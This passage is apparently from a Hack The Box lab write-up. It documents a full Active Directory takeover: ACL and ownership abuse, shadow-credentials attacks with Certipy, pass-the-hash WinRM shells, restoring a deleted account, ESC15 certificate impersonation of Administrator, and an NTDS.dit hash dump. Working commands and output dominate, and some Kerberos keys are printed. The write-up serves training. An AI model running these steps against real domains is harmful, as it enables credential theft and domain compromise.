### Phase 6: Shadow Credentials Attack on John

**16. ACL Analysis for Sam**  
ACL analysis revealed that `sam` had `WriteOwner` privileges over the user `john`.

**17. Ownership Manipulation**  
Using owneredit.py, ownership of the `john` object was transferred to `sam`.

```bash
❯ owneredit.py -action write -new-owner Sam -target John tombwatcher.htb/Sam:'NewPassword2025!' -dc-ip 10.129.20.248

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
❯
```


**18. GenericAll Grant**  
With ownership established, `sam` granted themselves `GenericAll` privileges over `john`.
```bash
❯ dacledit.py -action write -rights FullControl -principal Sam -target John tombwatcher.htb/Sam:'NewPassword2025!' -dc-ip 10.129.20.248

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20251120-220026.bak
[*] DACL modified successfully!

```


**19. Shadow Credentials Attack**  
The `GenericAll` privilege was abused to perform a Shadow Credentials attack on `john`.

```bash
❯ bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword2025!' --host dc01.tombwatcher.htb set owner john sam
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john

bloodyAD -d tombwatcher.htb -u sam -p 'NewPassword2025!' --host dc01.tombwatcher.htb add genericAll john sam

[+] sam has now GenericAll on john

❯ 
certipy shadow auto -target dc01.tombwatcher.htb -u sam -p 'NewPassword2025!' -account john
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'e53529c61eff4512946485de3b95de93'
[*] Adding Key Credential with device ID 'e53529c61eff4512946485de3b95de93' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID 'e53529c61eff4512946485de3b95de93' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'john@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'john.ccache'
[*] Wrote credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': <REDACTED>

 /home/h/HTB/C/To/03-Attack-Chains        
```

**Findings:** The NT hash for `john` was obtained: `<REDACTED>`.

**20. WinRM Access as John**  
The NT hash was used to establish a WinRM session as `john`.
```bash 
❯ nxc smb 10.129.20.248 -u john -H <REDACTED>
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:<REDACTED>
❯ nxc winrm 10.129.232.167 -u john -H <REDACTED>
WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.129.232.167  5985   DC01             [+] tombwatcher.htb\john:<REDACTED> (Pwn3d!)

 /home/h/HTB/C/To/03-Attack-Chains       
```

```bash 

❯ evil-winrm -i 10.129.232.167 -u john -H <REDACTED>


Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> cd ../
*Evil-WinRM* PS C:\Users\john> ls


    Directory: C:\Users\john


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       12/11/2024   6:51 PM                Desktop
d-r---       12/11/2024   6:51 PM                Documents
d-r---        9/15/2018   3:12 AM                Downloads
d-r---        9/15/2018   3:12 AM                Favorites
d-r---        9/15/2018   3:12 AM                Links
d-r---        9/15/2018   3:12 AM                Music
d-r---        9/15/2018   3:12 AM                Pictures
d-----        9/15/2018   3:12 AM                Saved Games
d-r---        9/15/2018   3:12 AM                Videos

```

**21. User Flag Retrieval**  
Once connected as `john`, the user flag was retrieved.

```powershell
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/20/2025   7:34 AM             34 user.txt


c*Evil-WinRM* PS C:\Users\john\Desktop>cat user.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\john\Desktop>

```


### Phase 7: Deleted Object Discovery and Restoration

**22. Privilege Enumeration**  
The privileges for `john` were checked to identify potential escalation paths.

```bash

evil-winrm -i 10.129.232.167 -u john -H <REDACTED>

*Evil-WinRM* PS C:\Users\john\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\john\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::74a8:3d64:8d29:c387
   Link-local IPv6 Address . . . . . : fe80::2c5f:bbef:952a:7b5%5
   IPv4 Address. . . . . . . . . . . : 10.129.232.167
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:acf1%5
                                       10.10.10.2
                                       10.129.0.1
*Evil-WinRM* PS C:\Users\john\Documents>

```

**Findings:** No direct privilege escalation paths were immediately apparent.


**23. Deleted Object Enumeration**  
During enumeration, a suspicious SID was noticed. Further investigation revealed deleted objects in Active Directory.
```bash
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"
*Evil-WinRM* PS C:\Users\john\Desktop>
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADOptionalFeature 'Recycle Bin Feature'


DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=tombwatcher,DC=htb
EnabledScopes      : {CN=Partitions,CN=Configuration,DC=tombwatcher,DC=htb, CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : 907469ef-52c5-41ab-ad19-5fdec9e45082
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest
```


**24. LDIFDE Export**  
The deleted objects were exported using ldifde for detailed analysis.

```bash
*Evil-WinRM* PS C:\Users\john\Desktop> ldifde -f deleted.ldf -s 127.0.0.1 -d "CN=Deleted Objects,DC=tombwatcher,DC=htb" -r "(isDeleted=TRUE)" -l objectSid,lastKnownParent,distinguishedName -x

Connecting to "127.0.0.1"
Logging in as current user using SSPI
Exporting directory to file deleted.ldf
Searching for entries...
Writing out entries4 entries exported

The command has completed successfully
....
*Evil-WinRM* PS C:\Users\john\Desktop>
*Evil-WinRM* PS C:\Users\john\Desktop> ls


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/20/2025  10:39 AM           1493 20251120103956_BloodHound.zip
-a----       11/20/2025  10:40 AM           1493 20251120104027_BloodHound.zip
-a----       11/20/2025  10:40 AM           1493 20251120104057_BloodHound.zip
-a----       11/20/2025  10:41 AM           1493 20251120104127_BloodHound.zip
-a----       11/20/2025  10:44 AM          11723 20251120104458_loot.zip
-a----       11/21/2025   3:36 AM           1308 deleted.ldf
-a----       11/20/2025  10:44 AM           8625 NzkzZThmZmEtZjFhYi00OTRmLTgzMzctMWY3N2FmZGE1ZmUy.bin
-a----       11/21/2025   3:28 AM         770279 PowerView.ps1
-a----       11/20/2025  10:38 AM        1051648 SharpHound.exe
-ar---       11/20/2025   7:34 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> cat  deleted.ldf
#CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb
#1.2.840.113556.1.4.417
dn: CN=Deleted Objects,DC=tombwatcher,DC=htb
changetype: add
distinguishedName: CN=Deleted Objects,DC=tombwatcher,DC=htb

dn: CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
changetype: add
distinguishedName:
 CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC
 =tombwatcher,DC=htb
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VQQAAA==
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb

dn: CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
changetype: add
distinguishedName:
 CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC
 =tombwatcher,DC=htb
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VgQAAA==
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb

dn: CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
changetype: add
distinguishedName:
 CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC
 =tombwatcher,DC=htb
objectSid:: AQUAAAAAAAUVAAAAArr/UoEu+1C7Lcd+VwQAAA==
lastKnownParent: OU=ADCS,DC=tombwatcher,DC=htb

*Evil-WinRM* PS C:\Users\john\Desktop> download  deleted.ldf

Info: Downloading C:\Users\john\Desktop\deleted.ldf to deleted.ldf

Info: Download successful!
*Evil-WinRM* PS C:\Users\john\Desktop>

```
**Findings:** Three deleted instances of a user `cert_admin` were discovered, with the most recent having SID ending in `1111`.

**25. Deleted Object Restoration**  
Since `john` had `GenericAll` privileges over the ADCS OU (where the deleted object's lastKnownParent pointed), the account could be restored.
```bash 
*Evil-WinRM* PS C:\Users\john\Desktop>
*Evil-WinRM* PS C:\Users\john\Desktop> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
*Evil-WinRM* PS C:\Users\john\Desktop> Get-ADUser cert_admin


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
Enabled           : True
GivenName         : cert_admin
Name              : cert_admin
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
SamAccountName    : cert_admin
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111
Surname           : cert_admin
UserPrincipalName :

```

**Findings:** The `cert_admin` account was successfully restored with SID `S-1-5-21-1392491010-1358638721-2126982587-1111`.

**26. Password Reset for Cert_admin**  
The password for the restored `cert_admin` account was reset.

```
Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'honeypooop' -AsPlainText -Force)
```

**27. Credential Validation for Cert_admin**  
The new password was validated against the domain controller.
```bash
❯ nxc smb 10.129.232.167 -u cert_admin -p honeypooop
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\cert_admin:honeypooop

 /home/h/De/Tools          
```
**Findings:** The credentials were valid for the user `cert_admin`.

### Phase 8: AD CS Enumeration and ESC15 Exploitation

**28. Shadow Credentials for Cert_admin**  
A Shadow Credentials attack was performed on `cert_admin` to obtain their NT hash.

```bash

❯ certipy shadow auto -u john@tombwatcher.htb  -hashes  :<REDACTED> -account cert_admin -dc-ip 10.129.232.167
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'cert_admin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '36c998f6deba4ea4834c7f50c0796d2b'
[*] Adding Key Credential with device ID '36c998f6deba4ea4834c7f50c0796d2b' to the Key Credentials for 'cert_admin'
[*] Successfully added Key Credential with device ID '36c998f6deba4ea4834c7f50c0796d2b' to the Key Credentials for 'cert_admin'
[*] Authenticating as 'cert_admin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'cert_admin@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'cert_admin.ccache'
[*] Wrote credential cache to 'cert_admin.ccache'
[*] Trying to retrieve NT hash for 'cert_admin'
[*] Restoring the old Key Credentials for 'cert_admin'
[*] Successfully restored the old Key Credentials for 'cert_admin'
[*] NT hash for 'cert_admin': <REDACTED>

 ~honeypoop/HTB/C/To/03-Attack-Chains   
```
**Findings:** The NT hash for `cert_admin` was obtained: `<REDACTED>`.

**29. Certificate Template Enumeration**  
Certipy was used to enumerate certificate templates and identify vulnerabilities.

```
❯ certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'honeypooop' -vulnerable -stdout


Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

 ~honeypoop/HTB/C/To/03-Attack-Chains   
```
**Findings:** The `WebServer` template was enabled and vulnerable to **ESC15** (CVE-2024-49019). It had schema version 1 with enrollee-supplied subjects, and `cert_admin` had enrollment rights.


**30. Certificate Request for Administrator**  
Using the ESC15 vulnerability, a certificate was requested for the `Administrator` account with the appropriate application policies.
```bash 

❯ certipy find -target dc01.tombwatcher.htb -u cert_admin -hashes :<REDACTED> -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC01.tombwatcher.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

 ~honeypoop/HTB/C/To/03-Attack-Chains   
```


**31. Administrator Hash Extraction**  
The obtained certificate was used to authenticate and retrieve the NT hash for the Domain Administrator.
```bash
❯ certipy req -u 'cert_admin@tombwatcher.htb' -hashes ':<REDACTED>' -dc-ip '10.129.20.248' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
❯


❯ certipy req -u 'cert_admin@tombwatcher.htb' -hashes ':<REDACTED>' -dc-ip '10.129.232.167' -target 'dc01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@tombwatcher.htb'
[*]     Security Extension SID: 'S-1-5-21-1392491010-1358638721-2126982587-500'
[*] Using principal: 'administrator@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:<REDACTED>

 ~honeypoop/HTB/C/To/03-Attack-Chains   
```

**Findings:** The NT hash for `Administrator` was obtained: `<REDACTED>`.

### Phase 9: Domain Administrator Access

**32. WinRM Access as Administrator**  
The Administrator hash was used to establish a WinRM session with full privileges.
```bash

❯ evil-winrm -i 10.129.232.167 -u administrator -H <REDACTED>

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint


```

**33. Root Flag Retrieval**  
With SYSTEM-level access achieved, the root flag was retrieved.

```bash 
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/20/2025   7:34 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

**34. NTDS.dit Dumping**  
As a final step, all domain hashes were extracted from the NTDS.dit database.
```bash
❯ secretsdump.py -just-dc -hashes 'aad3b435b51404eeaad3b435b51404ee:<REDACTED>' tombwatcher.htb/administrator@10.129.232.167

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Henry:1103:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
Alfred:1104:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
sam:1105:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
john:1106:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
ansible_dev$:1108:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:<REDACTED>
Administrator:aes128-cts-hmac-sha1-96:<REDACTED>
Administrator:des-cbc-md5:e686ecc7e06223a8
krbtgt:aes256-cts-hmac-sha1-96:8f542c56a5377012c49cca51cd05da37aeca080e9060e7609c64df6294e78e28
krbtgt:aes128-cts-hmac-sha1-96:ab84d027f672bb33d571a81d763db4c1
krbtgt:des-cbc-md5:f84cf26e672c1902
Henry:aes256-cts-hmac-sha1-96:311aa3cc0fd80d729d93e5e1a536583e00a2602e6ad1da923912cbafd800cb7c
Henry:aes128-cts-hmac-sha1-96:259d254eb2541b0d3db69ebd3dee4695
Henry:des-cbc-md5:199bda8040cb2f89
Alfred:aes256-cts-hmac-sha1-96:d9ff146302951a37f31e63517856f229c6cbde76dc3ee3199d05991fdc4054bb
Alfred:aes128-cts-hmac-sha1-96:e8ffe7e17a148309e41267647f1b051d
Alfred:des-cbc-md5:f27052ab5b7ffd08
sam:aes256-cts-hmac-sha1-96:76a7c7b2ae6019561bb7f45a39bdeb04bfcf6e89e1eb04ca88bf1921121be360
sam:aes128-cts-hmac-sha1-96:d91b011db63545ebea5f62b6215d84a8
sam:des-cbc-md5:cee68fa1ad20f832
john:aes256-cts-hmac-sha1-96:7db39419a586707f178cf5185597047589931429ea46bfb11813c86cab6136df
john:aes128-cts-hmac-sha1-96:d5b228c8638ca4c4c8e5d697082fe901
john:des-cbc-md5:43b9fef783ad8038
DC01$:aes256-cts-hmac-sha1-96:4bac22380dd160bce1048a092662b825f716276f16d64a88225895b9c34eecc3
DC01$:aes128-cts-hmac-sha1-96:2859bbfd267207104cdc068c1aaf19c8
DC01$:des-cbc-md5:37983b293e585251
ansible_dev$:aes256-cts-hmac-sha1-96:aa7df5cfa4812182382e302de4e327aa4ac5a8a1d8b2ef0186f947fff6eec0e8
ansible_dev$:aes128-cts-hmac-sha1-96:887b88f28a0a613ed6c79fd486e11406
ansible_dev$:des-cbc-md5:a732858301a83b46
[*] Cleaning up...

 /home/h/HTB/C/To/03-Attack-Chains   
```



### Alternative Method: NetExec Tombstone Module

The deleted object restoration could also be performed using NetExec's tombstone module.
```bash 
 uv run ./nxc/netexec.py ldap dc01.tombwatcher.htb -u john -H 'ffffffffffffffffffffffffffffffff:<REDACTED>'  -M tombstone -o ACTION=query
      Built netexec @ file:///opt/NetExec
Uninstalled 1 package in 0.49ms
Installed 1 package in 1ms
LDAP        10.129.20.248   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.129.20.248   389    DC01             [+] tombwatcher.htb\john:<REDACTED>
TOMBSTONE   10.129.20.248   389    DC01             Found 4 deleted objects
TOMBSTONE   10.129.20.248   389    DC01
TOMBSTONE   10.129.20.248   389    DC01             sAMAccountName      cert_admin
TOMBSTONE   10.129.20.248   389    DC01             dn      CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01             ID      f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
TOMBSTONE   10.129.20.248   389    DC01             isDeleted       TRUE
TOMBSTONE   10.129.20.248   389    DC01             lastKnownParent       OU=ADCS,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01
TOMBSTONE   10.129.20.248   389    DC01             sAMAccountName      cert_admin
TOMBSTONE   10.129.20.248   389    DC01             dn      CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01             ID      c1f1f0fe-df9c-494c-bf05-0679e181b358
TOMBSTONE   10.129.20.248   389    DC01             isDeleted       TRUE
TOMBSTONE   10.129.20.248   389    DC01             lastKnownParent       OU=ADCS,DC=tombwatcher,DC=htb
TOMBSTONE   10.129.20.248   389    DC01
TOMBSTONE   10.129.20.248   389    DC01             sAMAccountName      cert_admin
